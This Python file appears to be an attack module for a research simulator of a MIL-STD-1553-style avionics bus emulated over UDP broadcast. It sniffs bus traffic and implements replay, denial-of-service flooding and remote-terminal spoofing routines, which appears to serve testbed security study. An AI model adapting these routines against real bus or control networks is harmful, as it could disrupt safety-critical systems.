import threading
import time
import socket
import random


class Malicious_RT:

    # from Bus_Controller.BC_Simulator import Bus_Controller
    # from Remote_Terminal.RT_Simulator import Remote_Terminal
    from Bus_Controller.Message_Layer.ML_Encoder_BC \
        import MessageLayerEncoderBC
    # from Message_Layer.ML_Decoder_BC import MessageLayerDecoderBC
    # from Physical_Layer_Emulation.Communication_Socket_BC import BC_Listener
    # from Physical_Layer_Emulation.Communication_Socket_BC import BC_Sender

    cycle_list = list()
    captured_packets = list()
    
    def record_packets(self, data):
        self.cycle_list.append(str(data))
    
    def capture_packets(self):
        s = \
            socket.socket(
                socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.bind(("", 2001))

        while True:
            data, addr = s.recvfrom(1024)
            self.record_packets(str(data))
    
    def replay_attack(self):
        check_flag = 0
        while True:
            time.sleep(10)
            if self.captured_packets:
                print("Performing Replay attack")
                # for i in self.captured_packets:
                #    print("Sending ", i)
                packet_check = self.captured_packets.pop(0)
                if packet_check[:3] == '100':
                    self.send_packet(packet_check)
                    packet_check = self.captured_packets.pop(0)
                    while (packet_check[:3] == '001'):
                        self.send_packet(packet_check)
                        if self.captured_packets:
                            packet_check = self.captured_packets.pop(0)
                        else:
                            packet_check = '000'
                    if packet_check[:3] == '100':
                        self.captured_packets.insert(0, packet_check)
                    print("Replay of 1 cycle done")
    
    def dos_attack(self):
        print("Performing DoS attack")
        data_word_frame = "00100001101011010110"
        while True:
            time.sleep(1)
            #for captured_packet in self.captured_packets:
            self.send_packet(data_word_frame)
                # print(captured_packet)
    
    def spoofing_attack(self):
        print("Performing Spoofing attack")
        while True:
            rt_address = "01"
            sub_address_or_mode_code = "01"
            data_word_count_list = ["01", "02", "03", "04", "05", "06", "07", 
                                    "08", "09", "0A", "0B", "0C", "0D", "0E", 
                                    "0F", "10", "11", "12", "13", "14", "15", 
                                    "16", "17", "18", "19", "1A", "1B", "1C", 
                                    "1D", "1E", "1F"]
            data_word_count = random.choice(data_word_count_list)
            frames = self.MessageLayerEncoderBC().receive_message_from_RT(
                rt_address, sub_address_or_mode_code, data_word_count)
            print(frames)
            for frame in frames:
                # print(frame)
                self.send_packet(frame)
            time.sleep(20)

    def show_packets(self):
        while True:
            if capture_agent.cycle_list:
                # print(capture_agent.cycle_list)
                self.captured_packets.append(capture_agent.cycle_list[0])
                capture_agent.cycle_list = list()
                # capture_agent.replay_attack()

    def send_packet(self, message):
        destination_ip = "10.0.0.255"
        destination_port = [2000, 2001]
        socket_variable = \
            socket.socket(
                socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        socket_variable.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        for port in destination_port:
            socket_variable.sendto(message, (destination_ip, port))        


if __name__ == "__main__":
    capture_agent = Malicious_RT()
    capture_thread = threading.Thread(
        target=capture_agent.capture_packets
    )
    capture_thread.start()

    display_thread = threading.Thread(
        target=capture_agent.show_packets
    )
    display_thread.start()
    
    replay_thread = threading.Thread(
        target=capture_agent.replay_attack
    )
#    replay_thread.start()

    dos_thread = threading.Thread(
        target=capture_agent.dos_attack
    )
#    dos_thread.start()

    spoofing_thread = threading.Thread(
        target=capture_agent.spoofing_attack
    )
#    spoofing_thread.start()
